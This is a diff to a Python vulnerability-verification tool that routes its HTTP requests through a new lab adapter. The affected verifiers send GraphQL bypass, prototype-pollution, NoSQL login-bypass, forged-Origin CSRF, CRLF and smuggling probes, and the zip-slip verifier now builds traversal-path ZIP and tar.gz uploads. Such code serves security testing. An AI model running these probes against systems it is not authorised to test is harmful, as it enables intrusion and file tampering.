@@ -50,6 +50,28 @@ _CI_HINTS = ("cmd", "command", "exec", "run", "host", "ip", "address", "target",
 _AUTO_DOCKERFILE_NAME = ".binoracle_auto_Dockerfile"
 
 
+def _http_lab(base_url: str, endpoint: str, method: str = "GET", *,
+              headers=None, body=None, params=None, files=None,
+              timeout: float = 15.0) -> tuple:
+    """Thin adapter for lab verifiers: accepts (base_url, endpoint, method) convention
+    and returns (status_code, response_headers_dict, body_bytes).
+    Returns (0, {}, b"") on any connection error so callers can check `if st == 0`.
+    """
+    try:
+        r = _http_request(
+            method.upper(),
+            base_url.rstrip("/") + endpoint,
+            headers=headers or {},
+            data=body,
+            params=params,
+            files=files,
+            timeout=timeout,
+        )
+        return (r.status_code, dict(r.headers), r.content)
+    except Exception:
+        return (0, {}, b"")
+
+
 def _build_http_params(
     parameters, payload: str, http_method: str, target_url: str, headers: dict
 ) -> tuple:
@@ -7385,8 +7407,8 @@ def _graphql_post(base_url: str, endpoint: str, query: str,
         payload["variables"] = variables
     body = _json.dumps(payload).encode()
     try:
-        status, _, resp = _http_request(base_url, endpoint, "POST",
-                                        headers=headers, body=body, timeout=15.0)
+        status, _, resp = _http_lab(base_url, endpoint, "POST",
+                                    headers=headers, body=body, timeout=15.0)
         if resp:
             return _json.loads(resp.decode("utf-8", "replace"))
     except Exception as exc:
@@ -7409,9 +7431,9 @@ def _discover_graphql_endpoints(base_url: str,
     confirmed: List[str] = []
     for ep in _CANDIDATES:
         try:
-            status, _, resp_b = _http_request(base_url, ep, "POST",
-                                              headers=headers,
-                                              body=_INTRO.encode(), timeout=8.0)
+            status, _, resp_b = _http_lab(base_url, ep, "POST",
+                                          headers=headers,
+                                          body=_INTRO.encode(), timeout=8.0)
             if status in (200, 400):
                 body = (resp_b or b"").decode("utf-8", "replace")
                 if "__typename" in body or "__schema" in body or status == 200:
@@ -7474,7 +7496,7 @@ def _graphql_schema_probe(base_url: str, endpoint: str,
     try:
         import json as _json
         _body = _json.dumps(_INTROSPECT_QUERY).encode()
-        _status, _, _resp_b = _http_request(
+        _status, _, _resp_b = _http_lab(
             base_url, endpoint, "POST",
             headers=headers, body=_body, timeout=10.0)
         if _status not in (200, 201):
@@ -7577,7 +7599,7 @@ def verify_generic_graphql_bypass(
         # Step 1: introspección — confirmar que el endpoint GraphQL responde
         step(f"Paso 1: introspección GraphQL en {graphql_endpoint}")
         intro_query = '{"query":"{ __schema { queryType { name } } }"}'
-        s_intro, _, b_intro = _http_request(
+        s_intro, _, b_intro = _http_lab(
             base_url, graphql_endpoint, "POST",
             headers=gql_headers, body=intro_query.encode(), timeout=15.0)
         if s_intro == 0 or b_intro is None:
@@ -7592,7 +7614,7 @@ def verify_generic_graphql_bypass(
         # Step 2: query restringida SIN autenticación → debe rechazarse
         step(f"Paso 2: query restringida SIN autenticación (esperado {anon_expected_status})")
         body_forbidden = json.dumps({"query": forbidden_query}).encode()
-        s_anon, _, b_anon = _http_request(
+        s_anon, _, b_anon = _http_lab(
             base_url, graphql_endpoint, "POST",
             headers=gql_headers, body=body_forbidden, timeout=15.0)
         anon_body = (b_anon or b"").decode("utf-8", "replace")
@@ -7607,7 +7629,7 @@ def verify_generic_graphql_bypass(
             step(f"Paso 3: query con cabecera bypass {bypass_header}: {bypass_value[:60]}")
         else:
             step("Paso 3: query con vector de bypass estructural (sin cabecera extra)")
-        s_byp, _, b_byp = _http_request(
+        s_byp, _, b_byp = _http_lab(
             base_url, graphql_endpoint, "POST",
             headers=bypass_hdrs, body=body_forbidden, timeout=15.0)
         byp_body = (b_byp or b"").decode("utf-8", "replace")
@@ -8516,7 +8538,7 @@ def verify_generic_prototype_pollution(
             if token in pp["payload_json"]:
                 pl_json = pp["payload_json"]
             step(f"  probando variante: {pp['path']!r}")
-            s1, _, b1 = _http_request(
+            s1, _, b1 = _http_lab(
                 base_url, endpoint, http_method,
                 headers={"Content-Type": "application/json"},
                 body=pl_json.encode(), timeout=15.0)
@@ -8526,7 +8548,7 @@ def verify_generic_prototype_pollution(
             step(f"  respuesta {s1} para variante {pp['path']!r}")
 
             # Poll for prototype contamination
-            s2, _, b2 = _http_request(base_url, poll_endpoint, "GET", timeout=10.0)
+            s2, _, b2 = _http_lab(base_url, poll_endpoint, "GET", timeout=10.0)
             body2 = (b2 or b"").decode("utf-8", errors="replace")
             if token in body2:
                 winning_technique = pp["path"]
@@ -8567,7 +8589,7 @@ def verify_generic_prototype_pollution(
                     _barrier.wait(timeout=10)
                     with _ur.urlopen(_req, timeout=10):
                         pass
-                    _s, _, _b = _http_request(base_url, poll_endpoint, "GET", timeout=8.0)
+                    _s, _, _b = _http_lab(base_url, poll_endpoint, "GET", timeout=8.0)
                     _body = (_b or b"").decode("utf-8", errors="replace")
                     if token in _body:
                         with _results_lock:
@@ -9097,7 +9119,7 @@ def verify_generic_nosql_injection(
 
         # Control request with invalid credentials to establish baseline
         control_body = _json.dumps({inject_param: f"nosuchuser_{token_id}", "password": "wrongpwd_xyz", **_extra})
-        st_ctrl, _, b_ctrl = _http_request(
+        st_ctrl, _, b_ctrl = _http_lab(
             base_url, endpoint, http_method,
             headers=hdrs, body=control_body.encode(), timeout=15.0)
         body_ctrl = (b_ctrl or b"").decode("utf-8", errors="replace")
@@ -9110,7 +9132,7 @@ def verify_generic_nosql_injection(
             step(f"NoSQL injection (phase 1 — auth-bypass) payload {i+1}/{len(auth_bypass_payloads)}: "
                  f"{_json.dumps(payload)[:80]}...")
             body_data = _json.dumps(payload).encode()
-            st, _, body_bytes = _http_request(
+            st, _, body_bytes = _http_lab(
                 base_url, endpoint, http_method,
                 headers=hdrs, body=body_data, timeout=15.0)
             body = (body_bytes or b"").decode("utf-8", errors="replace")
@@ -9151,10 +9173,10 @@ def verify_generic_nosql_injection(
             try:
                 _bw_true_data = _json.dumps(_where_true_payload).encode()
                 _bw_false_data = _json.dumps(_where_false_payload).encode()
-                st_t, _, b_t = _http_request(base_url, endpoint, http_method,
-                                              headers=hdrs, body=_bw_true_data, timeout=15.0)
-                st_f, _, b_f = _http_request(base_url, endpoint, http_method,
-                                              headers=hdrs, body=_bw_false_data, timeout=15.0)
+                st_t, _, b_t = _http_lab(base_url, endpoint, http_method,
+                                          headers=hdrs, body=_bw_true_data, timeout=15.0)
+                st_f, _, b_f = _http_lab(base_url, endpoint, http_method,
+                                          headers=hdrs, body=_bw_false_data, timeout=15.0)
                 body_t = (b_t or b"").decode("utf-8", errors="replace")
                 body_f = (b_f or b"").decode("utf-8", errors="replace")
                 _len_diff = abs(len(body_t) - len(body_f))
@@ -9238,7 +9260,7 @@ def verify_generic_csrf(
             "Origin":       evil_origin,
             "Referer":      f"{evil_origin}/attack.html",
         }
-        st, resp_hdrs, body_bytes = _http_request(
+        st, resp_hdrs, body_bytes = _http_lab(
             base_url, endpoint, http_method,
             headers=hdrs, body=body_data.encode() if body_data else None,
             timeout=15.0)
@@ -9362,7 +9384,7 @@ def verify_generic_crlf_injection(
             if http_method != "GET":
                 hdrs["Content-Type"] = "application/x-www-form-urlencoded"
 
-            st, resp_hdrs, body_bytes = _http_request(
+            st, resp_hdrs, body_bytes = _http_lab(
                 base_url, ep_with_qs, http_method,
                 headers=hdrs, body=body_data, timeout=15.0)
             body = (body_bytes or b"").decode("utf-8", errors="replace")
@@ -9476,20 +9498,20 @@ def verify_generic_business_logic(
         def _send_bl(overrides: dict) -> tuple:
             p = {**base_params, **overrides}
             if http_method == "GET":
-                _st, _, _b = _http_request(base_url, endpoint, "GET",
-                                            params=p, timeout=15.0)
+                _st, _, _b = _http_lab(base_url, endpoint, "GET",
+                                        params=p, timeout=15.0)
             else:
-                _st, _, _b = _http_request(base_url, endpoint, http_method,
-                                            headers=hdrs_form,
-                                            body="&".join(f"{k}={v}" for k, v in p.items()).encode(),
-                                            timeout=15.0)
+                _st, _, _b = _http_lab(base_url, endpoint, http_method,
+                                        headers=hdrs_form,
+                                        body="&".join(f"{k}={v}" for k, v in p.items()).encode(),
+                                        timeout=15.0)
             return _st, (_b or b"").decode("utf-8", errors="replace")
 
         def _send_bl_json(overrides: dict) -> tuple:
             p = {**base_params, **overrides}
-            _st, _, _b = _http_request(base_url, endpoint, http_method,
-                                        headers=hdrs_json,
-                                        body=_json.dumps(p).encode(), timeout=15.0)
+            _st, _, _b = _http_lab(base_url, endpoint, http_method,
+                                    headers=hdrs_json,
+                                    body=_json.dumps(p).encode(), timeout=15.0)
             return _st, (_b or b"").decode("utf-8", errors="replace")
 
         # Control: legitimate values to establish baseline
@@ -9611,6 +9633,7 @@ def verify_generic_zip_slip(
     """
     import io as _io
     import zipfile as _zf
+    import tarfile as _tf
 
     step = on_step or (lambda _m: None)
     res = WpVerifyResult()
@@ -9639,23 +9662,41 @@ def verify_generic_zip_slip(
             f"/tmp/{canary_filename}",
         ]
 
+        def _make_zip(tpath: str) -> bytes:
+            buf = _io.BytesIO()
+            with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
+                zf.writestr(tpath, canary_token)
+            buf.seek(0)
+            return buf.read()
+
+        def _make_tar(tpath: str) -> bytes:
+            buf = _io.BytesIO()
+            with _tf.open(fileobj=buf, mode="w:gz") as tf:
+                content = canary_token.encode()
+                info = _tf.TarInfo(name=tpath)
+                info.size = len(content)
+                tf.addfile(info, _io.BytesIO(content))
+            buf.seek(0)
+            return buf.read()
+
+        # Try both ZIP and TAR.GZ variants
+        _archive_variants = [
+            ("zip", _make_zip, "application/zip", f"test_{canary_token[:8]}.zip"),
+            ("tar.gz", _make_tar, "application/gzip", f"test_{canary_token[:8]}.tar.gz"),
+        ]
+
         for traversal_path in traversal_paths:
-            # Build ZIP in memory with traversal entry
-            zip_buf = _io.BytesIO()
-            with _zf.ZipFile(zip_buf, "w", _zf.ZIP_DEFLATED) as zf:
-                zf.writestr(traversal_path, canary_token)
-            zip_buf.seek(0)
-            zip_bytes = zip_buf.read()
+            for _arc_type, _arc_builder, _arc_mime, _arc_filename in _archive_variants:
+                arc_bytes = _arc_builder(traversal_path)
+                step(f"zip-slip [{_arc_type}]: probando entrada {traversal_path!r} ({len(arc_bytes)}B)")
 
-            step(f"zip-slip: probando entrada {traversal_path!r} ({len(zip_bytes)}B)")
-
-            # Upload the ZIP via multipart POST
-            st, _, body_bytes = _http_request(
-                base_url, upload_endpoint, http_method,
-                files={file_param: (f"test_{canary_token[:8]}.zip", zip_bytes, "application/zip")},
-                timeout=20.0)
-            body = (body_bytes or b"").decode("utf-8", errors="replace")
-            step(f"  upload response: status={st} len={len(body)}")
+                # Upload the archive via multipart POST
+                st, _, body_bytes = _http_lab(
+                    base_url, upload_endpoint, http_method,
+                    files={file_param: (_arc_filename, arc_bytes, _arc_mime)},
+                    timeout=20.0)
+                body = (body_bytes or b"").decode("utf-8", errors="replace")
+                step(f"  upload response [{_arc_type}]: status={st} len={len(body)}")
 
             # Check 1: token in upload response (server processes inline)
             if canary_token in body:
@@ -9678,7 +9719,7 @@ def verify_generic_zip_slip(
 
             # Check 2: probe confirm_endpoint
             if confirm_endpoint:
-                s2, _, b2 = _http_request(base_url, confirm_endpoint, "GET", timeout=10.0)
+                s2, _, b2 = _http_lab(base_url, confirm_endpoint, "GET", timeout=10.0)
                 body2 = (b2 or b"").decode("utf-8", errors="replace")
                 if canary_token in body2:
                     res.verified = True
@@ -9703,7 +9744,7 @@ def verify_generic_zip_slip(
                 f"/uploads/../tmp/{canary_filename}",
                 f"/static/../tmp/{canary_filename}",
             ]:
-                s3, _, b3 = _http_request(base_url, probe_ep, "GET", timeout=8.0)
+                s3, _, b3 = _http_lab(base_url, probe_ep, "GET", timeout=8.0)
                 if s3 == 200 and canary_token in ((b3 or b"").decode("utf-8", errors="replace")):
                     res.verified = True
                     res.ok = True
@@ -12213,7 +12254,7 @@ def verify_generic_http_request_smuggling(
                         res.verified = True
                         res.ok = True
                         res.evidence.update({
-                            "smuggling_type": f"TE.TE-obfuscation",
+                            "smuggling_type": "TE.TE-obfuscation",
                             "obfuscated_value": _obf_val,
                             "baseline_ms": round(_baseline_ms, 1),
                             "tete_delay_ms": round(_tete_ms, 1),
